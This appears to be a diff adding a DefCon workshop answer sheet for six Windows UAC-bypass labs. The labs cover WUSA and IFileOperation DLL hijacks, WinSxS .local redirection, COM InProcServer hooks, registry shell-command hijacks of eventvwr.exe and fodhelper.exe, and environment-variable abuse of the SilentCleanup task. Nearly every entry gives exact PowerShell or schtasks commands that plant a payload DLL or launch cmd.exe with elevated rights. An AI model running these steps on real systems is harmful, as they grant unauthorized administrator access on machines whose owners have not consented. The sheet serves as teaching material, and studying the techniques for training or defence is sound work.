@@ -1,0 +1,140 @@
+=========================================[Lab1 - WUSA]
+
+(1) C:\Windows\System32\sysprep\sysprep.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll"
+ - Elevated-WUSA -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\sysprep\ -DestinationName cryptbase.dll
+
+(2) C:\Windows\System32\cliconfg.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll"
+ - Elevated-WUSA -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\ -DestinationName NTWDBLIB.DLL
+
+(3) C:\Windows\System32\migwiz\migwiz.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll"
+ - Elevated-WUSA -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\migwiz\ -DestinationName netutils.dll
+
+
+=========================================[Lab2 - IFileOperation]
+
+(1) C:\Windows\System32\mmc.exe rsop.msc
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll" (Process name contains mmc)
+ - Elevated-CopyIFileOperation -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\wbem\ -DestinationName wbemcomn.dll
+ 
+(2) C:\Windows\System32\mmc.exe compmgmt.msc
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll" (Process name contains mmc)
+ - Elevated-CopyIFileOperation -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\ -DestinationName elsext.dll
+
+(3) C:\Windows\System32\oobe\setupsqm.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll"
+ - Elevated-CopyIFileOperation -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\oobe\ -DestinationName WDSCORE.dll
+
+(4) C:\Windows\System32\odbcad32.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path end in ".dll"
+ - Elevated-CopyIFileOperation -Payload C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll -DestinationPath C:\Windows\System32\ -DestinationName BidLab.dll
+
+
+=========================================[Lab3 - WinSxS]
+
+## ! The .local paths here are based on the Windows 7 VM and may vary on different versions ! ##
+
+(1) C:\Windows\System32\sysprep\sysprep.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path contains ".local"
+ - Create folder structure: sysprep.exe.local
+                            |-> amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_fa396087175ac9ac
+                                |-> comctl32.dll
+ - Elevated-CopyIFileOperation -Payload C:\Some\Path\sysprep.exe.local -DestinationPath C:\Windows\System32\sysprep\ -DestinationName sysprep.exe.local
+
+(2) C:\Windows\System32\msconfig.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path contains ".local"
+ - Create folder structure: msconfig.exe.local
+                            |-> amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_fa396087175ac9ac
+                                |-> comctl32.dll
+ - Elevated-CopyIFileOperation -Payload C:\Some\Path\msconfig.exe.local -DestinationPath C:\Windows\System32\ -DestinationName msconfig.exe.local
+
+(3) C:\Windows\System32\MultiDigiMon.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path contains ".local"
+ - Create folder structure: MultiDigiMon.exe.local
+                            |-> amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_fa396087175ac9ac
+                                |-> comctl32.dll
+ - Elevated-CopyIFileOperation -Payload C:\Some\Path\MultiDigiMon.exe.local -DestinationPath C:\Windows\System32\sysprep\ -DestinationName sysprep.exe.local
+
+
+=========================================[Lab4 - COM Handlers]
+
+## ! Start regedit before doing the lab, you will end up hooking it inadvertently ! ##
+
+(1) C:\Windows\System32\eventvwr.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path exclude "HKLM\" "HKCR\" "\HKU", Path contains "InProcServer"
+ - Many CLSID's to try, this one works, 0A29FF9E-7F9C-4437-8B11-F424491E3931
+ - Hook-InProcServer -CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 -Path C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll
+ - No Window on 7 but check Process Explorer, on 10 the console pops up as normal
+
+(2) C:\Windows\System32\mmc.exe CompMgmt.msc
+
+ - Filter: NAME NOT FOUND, High Integrity, Path exclude "HKLM\" "HKCR\", Path contains "InProcServer"
+ - Many CLSID's to try, this one works, 0A29FF9E-7F9C-4437-8B11-F424491E3931
+ - Hook-InProcServer -CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 -Path C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll
+
+(3) C:\Windows\System32\recdisc.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path exclude "HKLM\" "HKCR\", Path contains "InProcServer"
+ - CLSID: 08244EE6-92F0-47F2-9FC9-929BAA2E7235
+ - Hook-InProcServer -CLSID 08244EE6-92F0-47F2-9FC9-929BAA2E7235 -Path C:\DefCon-Tools\Yamabiko\yamabiko-x64.dll
+
+
+=========================================[Lab5 - ShellExecute -> LNK]
+
+(1) C:\Windows\System32\eventvwr.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path exclude "HKLM\" "HKCR\", Path includes "\command"
+ - New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
+ - New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "C:\Windows\System32\cmd.exe /c calc.exe" -PropertyType string -Force
+ 
+(2) C:\Windows\System32\fodhelper.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path exclude "HKLM\" "HKCR\", Path includes "\command"
+ - New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+ - New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "C:\Windows\System32\cmd.exe /c calc.exe" -PropertyType string -Force
+ - New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -PropertyType string -Force
+
+(3) C:\Windows\System32\CompMgmtLauncher.exe
+
+ - Filter: NAME NOT FOUND, High Integrity, Path exclude "HKLM\" "HKCR\", Path includes "\command"
+ - New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
+ - New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "C:\Windows\System32\cmd.exe"
+
+
+=========================================[Lab6 - ShellExecute -> LNK]
+
+(1) C:\Windows\System32\CompMgmtLauncher.exe
+
+ - Filter: Command line contains "CompMgmtLauncher", path contains ".lnk"
+ - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Computer Management.lnk
+   |-> %ProgramData%
+ # Create payload
+ - New-Item -Path "C:\Users\DefCon\Desktop\Microsoft\Windows\Start Menu\Programs\Administrative Tools" -Type Directory -Force
+ - $WshShell = New-Object -comObject WScript.Shell
+ - $Shortcut = $WshShell.CreateShortcut("C:\Users\DefCon\Desktop\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Computer Management.lnk")
+ - $Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
+ - $Shortcut.Save()
+ # Define environment variable for %ProgramData%
+ - New-ItemProperty -Path "HKCU:\Environment" -Name "ProgramData" -Value "C:\Users\DefCon\Desktop" -PropertyType string -Force
+
+(2) schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+ - schtasks /query /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /v /fo list
+ - New-Item -Path "C:\Users\DefCon\Desktop\system32\" -Type Directory -Force
+ - Copy-Item -Path "C:\Windows\System32\cmd.exe" -Destination "C:\Users\DefCon\Desktop\system32\cleanmgr.exe"
+ - New-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "C:\Users\DefCon\Desktop" -PropertyType string -Force
+ # Or just..
+ - New-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "C:\Windows\System32\cmd.exe /K" -PropertyType string -Force
